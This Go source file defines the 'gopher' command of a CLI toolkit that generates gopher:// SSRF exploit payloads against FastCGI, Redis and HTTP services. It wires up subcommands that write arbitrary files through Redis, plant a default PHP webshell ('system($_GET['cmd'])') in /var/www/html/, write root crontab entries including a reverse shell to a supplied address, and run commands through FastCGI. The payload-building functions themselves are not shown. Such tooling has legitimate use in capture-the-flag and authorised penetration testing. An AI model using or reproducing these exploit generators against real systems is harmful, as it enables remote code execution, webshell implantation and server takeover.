package gopher

import (
	"fmt"
	"net/url"

	"github.com/spf13/cobra"
	"github.com/virzz/logger"
	"github.com/virzz/virzz/common"
	"github.com/virzz/virzz/utils"
)

// fastCGICmd
var fastCGICmd = &cobra.Command{
	Use:   "fcgi [addr]",
	Short: "Gopher Exp FastCGI",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "/usr/share/php/PEAR.php"
		}
		r, err := expFastCGI(addr, command, filename)
		if err != nil {
			return err
		}
		for i := 0; i < urlencode; i++ {
			r = url.QueryEscape(r)
		}
		return common.Output(r)
	},
}

// redisCmd
var redisCmd = &cobra.Command{
	Use:   "redis",
	Short: "Gopher Exp Redis",
}

// redisWriteCmd
var redisWriteCmd = &cobra.Command{
	Use:   "write [addr]",
	Short: "Gopher Exp Redis Write Any File",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "virzz.txt"
		}
		if filePath == "" {
			filePath = "/var/www/html/"
		}
		if content == "" {
			content = "Hello world"
		}
		r, err := expRedisCmd(addr, filePath, filename, content)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// redisWebshellCmd
var redisWebshellCmd = &cobra.Command{
	Use:   "webshell [addr]",
	Short: "Gopher Exp Redis Write Webshell",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "virzz.php"
		}
		if filePath == "" {
			filePath = "/var/www/html/"
		}
		if content == "" {
			content = "\r\n<?php system($_GET['cmd']);?>\r\n"
		}
		r, err := expRedisCmd(addr, filePath, filename, content)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// redisReverseCmd
var redisReverseCmd = &cobra.Command{
	Use:   "revese [addr]",
	Short: "Gopher Exp Redis Write Crontab Revese Shell",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "root"
		}
		if filePath == "" {
			filePath = "/var/spool/cron/"
		}
		if reverseAddr == "" {
			return fmt.Errorf("must need Reverse Addr")
		}
		r, err := expRedisReverseShell(addr, filePath, filename, reverseAddr)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// redisCrontabCmd
var redisCrontabCmd = &cobra.Command{
	Use:   "cron [addr]",
	Short: "Gopher Exp Redis Write Crontab",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "root"
		}
		if filePath == "" {
			filePath = "/var/spool/cron/"
		}
		if content == "" {
			content = "id > /var/www/html/virzz.txt"
		}
		r, err := expRedisCrontabFile(addr, filePath, filename, content)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// httpPostCmd
var httpPostCmd = &cobra.Command{
	Use:   "post [url]",
	Short: "Gopher Exp HTTP POST",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		host, uri, err := utils.ParseURLToHostAndURI(args[0])
		if err != nil {
			return err
		}
		if len(datas) == 0 {
			return cmd.Help()
		}
		r, err := expHTTPPost(host, uri, datas)
		if err != nil {
			return err
		}
		for i := 0; i < urlencode; i++ {
			r = url.QueryEscape(r)
		}
		return common.Output(r)
	},
}

// httpUploadCmd
var httpUploadCmd = &cobra.Command{
	Use:   "upload [url]",
	Short: "Gopher Exp HTTP Upload",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		host, uri, err := utils.ParseURLToHostAndURI(args[0])
		if err != nil {
			return err
		}
		if len(datas) == 0 {
			logger.Error("Require data by -d a=1 / a=@file")
			return cmd.Help()
		}
		r, err := expHTTPUpload(host, uri, datas)
		if err != nil {
			return err
		}
		for i := 0; i < urlencode; i++ {
			r = url.QueryEscape(r)
		}
		return common.Output(r)
	},
}

// listenCmd
var listenCmd = &cobra.Command{
	Use:   "listen [addr]",
	Short: "Gopher Exp By Listen",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		r, err := expGopher(addr, port, times, quit)
		if err != nil {
			return err
		}
		for i := 0; i < urlencode; i++ {
			r = url.QueryEscape(r)
		}
		return common.Output(r)
	},
}

var (
	command   string
	filename  string
	urlencode int

	filePath    string
	content     string
	reverseAddr string

	datas map[string]string

	port, times int
	quit        bool
)

// GopherCmd -
var GopherCmd = &cobra.Command{
	Use:           "gopher",
	Short:         "Generate Gopher Exp",
	SilenceErrors: true,
	SilenceUsage:  true,
	RunE: func(cmd *cobra.Command, args []string) error {
		return cmd.Help()
	},
}

func init() {
	GopherCmd.PersistentFlags().CountVarP(&urlencode, "urlencode", "e", "URL Encode (-e , -ee -eee)")
	GopherCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")

	fastCGICmd.Flags().StringVarP(&command, "command", "c", "id", "Command")
	// fastCGICmd.Flags().StringVarP(&filename, "filename", "f", "", "Delimiter")

	// redisCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")
	redisCmd.PersistentFlags().StringVarP(&filePath, "filepath", "p", "", "Filepath")
	redisCmd.PersistentFlags().StringVarP(&content, "content", "c", "", "Content")

	redisReverseCmd.Flags().StringVarP(&reverseAddr, "reverse", "r", "", "Reverse Addr")

	httpPostCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data")
	httpUploadCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data/upload file")

	listenCmd.Flags().IntVarP(&port, "port", "p", 9527, "Listen Port")
	listenCmd.Flags().IntVarP(&times, "times", "t", 1, "Accept Times")
	listenCmd.Flags().BoolVarP(&quit, "quit", "q", false, "Redis Quit")

	redisCmd.AddCommand(redisWriteCmd, redisWebshellCmd, redisCrontabCmd, redisReverseCmd)

	GopherCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd, listenCmd)
	GopherCmd.SuggestionsMinimumDistance = 1
}

func ExportCommand() []*cobra.Command {
	return []*cobra.Command{
		GopherCmd,
	}
}
